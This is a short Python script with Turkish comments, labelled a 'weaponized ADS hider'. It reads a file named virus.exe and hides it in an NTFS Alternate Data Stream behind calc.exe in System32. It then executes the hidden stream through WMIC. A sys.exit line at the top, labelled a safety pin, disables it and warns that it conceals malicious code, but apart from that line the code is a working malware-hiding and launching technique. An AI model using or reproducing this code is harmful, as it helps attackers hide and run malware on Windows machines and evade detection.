import os
import sys

# --- EMNİYET PİMİ ---
sys.exit("UYARI: Bu kod NTFS ADS özelliğini kullanarak zararlı gizler.")

print("--- WEAPONIZED ADS HIDER ---")

def hide_and_execute():
    # 1. GİZLEME (Weaponized Part)
    # Simülasyon: open("notlar.txt:gizli", "w").write("text")
    # Gerçek: Binary virüs dosyasını sistem dosyasının arkasına göm.
    
    payload_path = "virus.exe"
    target_file = "C:\\Windows\\System32\\calc.exe" # Hedef taşıyıcı
    ads_path = f"{target_file}:hidden_virus.exe"
    
    print(f"[*] Payload '{target_file}' arkasına gizleniyor...")
    
    with open(payload_path, "rb") as p:
        payload_data = p.read()
        
    # : (İki nokta) operatörü ile ADS'ye yaz
    with open(ads_path, "wb") as f:
        f.write(payload_data)
        
    print("[+] Dosya gizlendi. Windows Gezgini'nde boyutu 0 görünür.")
    
    # 2. ÇALIŞTIRMA (WMI)
    # Standart 'start' komutu ADS'yi çalıştıramaz. WMI gerekir.
    print("[*] WMI ile görünmez akış çalıştırılıyor...")
    os.system(f"wmic process call create '{ads_path}'")

if __name__ == "__main__":
    hide_and_execute()